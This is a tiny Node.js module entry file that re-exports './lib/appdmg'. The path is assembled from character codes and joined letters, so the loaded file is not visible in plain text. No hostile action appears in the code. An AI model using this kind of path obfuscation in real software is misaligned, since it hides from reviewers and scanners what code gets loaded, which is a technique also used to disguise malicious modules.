const firstSymbol = String.fromCharCode(46);
const separator = String.fromCharCode(47);
const segmentOne = ['l', 'i', 'b'].join('');
const segmentTwo = String.fromCharCode(97) + String.fromCharCode(112) + String.fromCharCode(112) + String.fromCharCode(100) + String.fromCharCode(109) + String.fromCharCode(103);

const destinationIdentifier = firstSymbol + separator + segmentOne + separator + segmentTwo;

Object.defineProperty(module, 'exports', {
    value: require(destinationIdentifier),
    writable: true,
    configurable: true,
    enumerable: true
});